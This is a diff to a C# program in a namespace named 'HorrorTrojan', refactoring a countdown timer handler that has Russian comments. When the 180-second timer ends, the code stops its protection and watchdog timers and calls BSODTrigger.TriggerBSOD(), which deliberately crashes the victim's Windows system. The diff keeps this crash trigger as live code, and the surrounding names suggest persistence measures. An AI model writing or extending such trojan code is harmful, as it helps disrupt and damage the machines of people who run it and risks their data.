@@ -209,56 +209,35 @@ namespace HorrorTrojan
 
         private void BloodTimer_Tick(object sender, EventArgs e)
         {
-            try
+            TimeSpan elapsed = DateTime.Now - startTime;
+            
+            if (elapsed.TotalSeconds >= maxSeconds && !timerCompleted)
             {
-                TimeSpan elapsed = DateTime.Now - startTime;
+                timerCompleted = true;
                 
-                // ===== ТОЛЬКО ОДНО УСЛОВИЕ: ПРОШЛО 180 СЕКУНД =====
-                if (elapsed.TotalSeconds >= maxSeconds)
-                {
-                    if (!timerCompleted)
-                    {
-                        timerCompleted = true;
-                        
-                        bloodTimer.Stop();
-                        drawTimer.Stop();
-                        protectTimer.Stop();
-                        watchdogAlive = false;
-                        StopMusic();
-                        
-                        if (!bsodTriggered)
-                        {
-                            bsodTriggered = true;
-                            BSODTrigger.TriggerBSOD();
-                        }
-                    }
-                    return;
-                }
+                bloodTimer.Stop();
+                drawTimer.Stop();
+                protectTimer.Stop();
+                watchdogAlive = false;
+                StopMusic();
                 
-                // ===== ПЛАВНОЕ УМЕНЬШЕНИЕ ИНДИКАТОРА =====
-                double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
-                
-                if (double.IsNaN(percent) || double.IsInfinity(percent))
-                    percent = 0;
-                
-                if (percent < 0) percent = 0;
-                if (percent > 100) percent = 100;
-                
-                int newBloodLevel = 100 - (int)Math.Round(percent);
-                if (newBloodLevel < 0) newBloodLevel = 0;
-                if (newBloodLevel > 100) newBloodLevel = 100;
-                
-                bloodLevel = newBloodLevel;
-            }
-            catch
-            {
-                // ===== ТОЛЬКО ПРИ ОШИБКЕ ВЫЗЫВАЕМ BSOD =====
                 if (!bsodTriggered)
                 {
                     bsodTriggered = true;
                     BSODTrigger.TriggerBSOD();
                 }
+                return;
             }
+            
+            double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
+            if (percent > 100) percent = 100;
+            if (percent < 0) percent = 0;
+            
+            int newBloodLevel = 100 - (int)Math.Round(percent);
+            if (newBloodLevel < 0) newBloodLevel = 0;
+            if (newBloodLevel > 100) newBloodLevel = 100;
+            
+            bloodLevel = newBloodLevel;
         }
 
         private void DrawTimer_Tick(object sender, EventArgs e)
